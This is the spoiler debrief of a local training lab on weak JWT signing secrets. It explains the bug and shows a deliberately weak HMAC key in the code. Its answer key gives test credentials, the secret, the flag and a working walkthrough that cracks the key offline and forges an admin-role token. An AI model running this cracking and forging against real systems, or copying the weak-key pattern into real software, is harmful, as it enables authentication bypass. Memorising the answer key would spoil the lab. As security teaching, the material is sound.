# 🔓 Masquerade Operation 05 — Exposed Claim · Jackal ⚔ Pulse · WSTG-SESS-10

**Spoilers below.** If you haven't played yet, use [`CHALLENGER.md`](CHALLENGER.md) first.

## The one-sentence lesson

**A signature only proves that whoever holds the key produced it — it says nothing about how
easy that key was to find, and a short, guessable HMAC secret makes "correctly verified" and
"forgeable" the same thing.**

Operation 04 was a broken *check*: the verifier could be talked into skipping the signature
entirely. This one is a broken *secret*: the check runs every single time, exactly as
designed, against a key an attacker can recover in seconds with nothing but a wordlist. Two
completely different root causes that both end the same way — an attacker signing whatever
they want.

---

## Why this bug exists (the mental model)

An HMAC signature is only as strong as three things: the algorithm (SHA-256 here — genuinely
fine), the *implementation* (this one's correct — no length-extension issues, no truncation),
and the **key**. A cryptographically excellent algorithm signing with a key like `relay41` is
not a cryptography problem. It's a credential-management problem wearing cryptography's
clothes.

This happens constantly in the real world because a JWT signing secret doesn't *feel* like a
credential the way a database password does. It's often generated once, dropped into a config
file or an environment variable, and never rotated, never length-checked, never run through
the same policy a login password would be required to meet. Teams that would never accept
`relay41` as a user's account password will absolutely ship it as the key protecting *every
single session in the entire application* — because nobody thought of it as a password at
all.

The second half of this mission's name is about a different, quieter failure: **claims
themselves are only ever encoded, never encrypted, no matter how strong the signature is.**
A perfectly-signed, perfectly-unforgeable token can still leak sensitive data to anyone
holding it, because holding a JWT and being able to *read* it are the same thing. The
signature protects integrity. It has never once protected confidentiality.

---

## The R6 framing

**Jackal's** Eyenox Model III reads footprints — literal traces a target left behind, without
the target ever handing over anything directly. That's the offline-cracking half of this
mission exactly: nobody gave up the signing key. It was recoverable from evidence the app
itself produced (a signed token) plus a systematic, patient search — tracking, not stealing.

**Pulse's** Cardiac Sensor listens through walls for a heartbeat — genuine, real-time,
independent verification of what's actually there, no assumptions. That makes Pulse the most
pointed irony in this campaign so far: Oregon Relay's signature check is *exactly* that kind
of honest, unconditional verification — it really works, every time. The failure isn't in the
listening. It's that what Pulse is listening *for* was never worth protecting in the first
place.

---

## Walking through what you had to do (and what to notice)

### Step 1 — Decode everything, not just the claim you expect

Your real token's payload has three meaningful fields, not two: `sub`, `role`, and
`support_pin`. Nothing in Operation 04 prepared you to expect that third one — which is
exactly the point of reading the whole payload instead of skimming for the field you already
know matters.

*What to pay attention to:* `support_pin` doesn't do anything. It's not checked anywhere,
doesn't gate any endpoint, doesn't unlock the flag. It's just sitting there, in plaintext, in
a token every single relay client is required to carry. That's Finding 2, in full, the moment
you see it — no further exploitation needed, only recognition.

### Step 2 — Rule out Operation 04's bug on purpose

Try `alg:none` here. It fails, with a specific, honest error: `"Only HS256 is accepted."` This
matters more than it looks like it should.

*What to pay attention to:* a report that says "I tried the obvious thing and it didn't work,
so here's what I tried next" is a *stronger* report than one that jumps straight to the
working exploit. It proves you tested the general bug class, not just this one payload.

### Step 3 — Confirm the signature is genuinely checked

Tamper your payload's `role` field without recomputing the signature, and present it. It gets
rejected — `"Signature does not match."` Combined with Step 2, you now know two things for
certain: this verifier enforces one fixed algorithm, and it recomputes and compares the
signature every time, unconditionally.

*What to pay attention to:* this narrows the entire attack surface to one place. If neither
"skip the check" nor "resubmit unchanged" works, the only remaining lever is the key the check
runs against.

### Step 4 — Recover the key offline

HMAC-SHA256 verification is just math — you don't need the server's permission or cooperation
to try it. For each candidate in `wordlists/op5_jwt_secrets.txt`, compute
`HMAC-SHA256(header + "." + payload, candidate)` over your *real* token's header and payload,
and compare the result to your real token's actual signature segment. One candidate matches.

*What to pay attention to:* every attempt here happens entirely on your own machine. The
first request back to the server doesn't happen until you already know the answer — this is
what makes offline secret-cracking so dangerous in practice: there's no rate limit, no lockout,
no log entry to catch it, because the target never sees any of the attempts.

### Step 5 — Forge a brand-new token, correctly signed

With the real key in hand, build any header and payload you want — this doesn't have to be a
copy of your original token with one field changed. Sign the exact string
`base64url(header) + "." + base64url(payload)` with the recovered key, and you have a token
that is, by every technical measure, completely legitimate.

*What to pay attention to:* there is no meaningful difference, from the server's point of
view, between this token and one it issued itself. That's the actual severity of a cracked
signing key — it isn't "bypass one check." It's "become the issuer."

---

## The actual code behind it, in plain language

**1. Verification is correct, on purpose — this is not Operation 04's function**

```python
def masq5_verify_token(token):
    ...
    if str(header.get("alg", "")).strip().upper() != "HS256":
        return False, "Only HS256 is accepted."
    if not hmac.compare_digest(masq5_sign(h_b64, p_b64, MASQ5_SECRET), sig_b64):
        return False, "Signature does not match."
    return True, payload
```

Every path through this function is honest. There's no `alg == "none"` shortcut, no case
where verification is skipped. If you've read Operation 04's DEBRIEF, this function is what
its *fix* looks like — a hard-coded algorithm, an unconditional signature comparison. And it's
still exploitable, because correctness of the *check* and strength of the *key* are two
completely separate properties.

**2. The actual vulnerability is one constant**

```python
MASQ5_SECRET = "relay41"            # weak on purpose -- sits in wordlists/op5_jwt_secrets.txt
```

That's it. That's the entire bug. Not a missing check, not a logic error — a nine-character
value that happens to also appear in a 40-line wordlist. A correct version doesn't change a
single line of `masq5_verify_token()`; it changes what this constant *is*:

```python
# what SHOULD happen (not in this app):
MASQ5_SECRET = secrets.token_urlsafe(48)   # long, random, generated once, never a "word" at all
```

High entropy, generated by a CSPRNG, long enough that a wordlist — or even a serious offline
brute-force — has no realistic chance of ever recovering it.

**3. The exposed claim never needed an exploit at all**

```python
payload = {"sub": username, "role": role, "support_pin": MASQ5_SUPPORT_PIN, "iat": int(time.time())}
```

`support_pin` is issued into every token unconditionally, and nothing anywhere in this app
ever encrypts a JWT payload — nothing does, because that's not what JWTs are for. The fix here
isn't a code change to how tokens are verified at all. It's a data-classification decision made
one line earlier: this value should never have been placed in a token in the first place.

---

## Self-check — can you explain these without looking back up?

1. In one sentence, what's the difference between this mission's root cause and Operation 04's
   — both let an attacker forge a token, but for entirely different reasons?
2. Why does confirming `alg:none` fails, and confirming a stale-signature tamper also fails,
   matter for your report even though neither one is the actual finding?
3. Why is offline secret-cracking more dangerous in practice than an online password
   brute-force against a login form, even when the search space is the same size?
4. What's the one-line difference between the vulnerable constant in this app and a secure
   version of it — and why doesn't fixing it require touching the verification function at
   all?
5. Why does the `support_pin` finding not require any exploitation to report, and why does a
   real assessment still need to write it up as its own finding rather than folding it into
   the signing-key finding?

---

## Answer key (reference)

- **Test account:** `field.agent` : `Oregon2024!` (given — not the point of this mission)
- **Weak signing secret:** `relay41` (present in `wordlists/op5_jwt_secrets.txt`)
- **Exposed secondary claim:** `support_pin` — sensitive data with no business being in a JWT
  payload at all
- **Real endpoint:** `GET /masquerade/op5/relay`, header `Authorization: Bearer <token>`
- **Flag:** `R6S{jackal_tracked_the_weak_secret_to_dispatch_lead}`
- **Automated:** `python3 masquerade/op5/solver.py http://localhost:8000`

### Manual walkthrough

```bash
# 1) log in, capture a real token
TOKEN=$(curl -s -X POST http://localhost:8000/masquerade/op5/login \
  -d 'username=field.agent&password=Oregon2024!' \
  | grep -oP '(?<=select-all">)[^<]+')
H=$(echo "$TOKEN" | cut -d. -f1); P=$(echo "$TOKEN" | cut -d. -f2); SIG=$(echo "$TOKEN" | cut -d. -f3)

# 2) crack the secret offline against the provided wordlist
python3 - "$H" "$P" "$SIG" <<'PY'
import sys, hmac, hashlib, base64
h, p, sig = sys.argv[1:4]
def b64e(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
for line in open("wordlists/op5_jwt_secrets.txt"):
    candidate = line.strip()
    if candidate and b64e(hmac.new(candidate.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest()) == sig:
        print("CRACKED:", candidate)
        break
PY

# 3) forge a brand-new token with the recovered secret (example uses the real one directly)
python3 - <<'PY'
import json, hmac, hashlib, base64
def b64e(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
h = b64e(json.dumps({"typ":"JWT","alg":"HS256"}).encode())
p = b64e(json.dumps({"sub":"jackal","role":"dispatch_lead","iat":1}).encode())
sig = b64e(hmac.new(b"relay41", f"{h}.{p}".encode(), hashlib.sha256).digest())
print(f"{h}.{p}.{sig}")
PY

# 4) present it
curl -s http://localhost:8000/masquerade/op5/relay -H "Authorization: Bearer <forged token from step 3>"
```

### Report language

- **Finding 1 (WSTG-SESS-10):** The application signs JSON Web Tokens using a short,
  dictionary-guessable HMAC-SHA256 secret. An attacker who captures any single valid token can
  recover the signing key offline via a wordlist or brute-force attack, entirely without
  interacting with the target application, and subsequently forge arbitrary tokens with
  attacker-chosen claims (including elevated roles) that pass signature verification
  legitimately. *CWE-326 — Inadequate Encryption Strength / CWE-798 — Use of Hard-coded
  Credentials.*
- **Finding 2 (WSTG-SESS-10, secondary):** The token payload includes a `support_pin` claim
  containing sensitive, unrelated verification data. Because JWT payloads are base64url-encoded
  only, never encrypted, this value is readable in plaintext by anyone who obtains a token —
  including the token's own legitimate holder inspecting client-side storage, any intermediary
  that logs request headers, and any XSS payload capable of reading `localStorage` or request
  headers. *CWE-200 — Exposure of Sensitive Information to an Unauthorized Actor.*
- **Impact:** Finding 1 allows complete authentication and authorization bypass — an attacker
  who recovers the key can mint tokens indistinguishable from ones the server issued itself,
  with any claims they choose. Finding 2 independently exposes sensitive data regardless of
  whether the signing key is ever compromised.
- **Remediation:** Generate the JWT signing secret with a cryptographically secure random
  generator, at sufficient length (256 bits or more for HS256) that offline brute-force is
  infeasible; store it as a genuine secret (secrets manager or equivalent), never as a
  memorable string. Separately, audit every claim placed in a JWT payload against the
  assumption that anyone holding the token can read it in plaintext, and remove any claim that
  wouldn't be acceptable to log or display unencrypted.

---

**Next in this campaign:** Operation 06, *Delegated Trust* — attacking OAuth. Locked until
this one's cleared, revealed on Command the moment it is.
